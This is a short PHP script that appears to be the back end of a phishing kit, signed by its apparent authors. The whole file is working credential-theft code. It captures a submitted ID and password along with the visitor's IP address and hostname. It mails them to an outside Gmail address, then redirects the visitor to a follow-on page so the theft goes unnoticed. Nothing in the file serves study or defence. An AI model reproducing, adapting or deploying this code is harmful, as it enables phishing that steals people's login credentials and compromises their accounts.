<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| By_X_X_Prince  |+------------\n";
$bilsmg .= "id                       :  ".$_POST['prince']."\n";
$bilsmg .= "Pass                       : ".$_POST['zaml']."\n";
$bilsmg .= "------------+| By Ilyas   |+------------\n";
$bilsmg .= "From $ip check in http://whoer.net/check?host=$ip   \n";
$bilsub = "POP1|".$_POST['id1']."|".$_POST['postal1']."|Fr0m ".$ip;
$bilhead = "From: poporangesms@gmail.com";
mail("poporangesms@gmail.com",$bilsub,$bilsmg,$bilhead);
header("Location: valis");
?>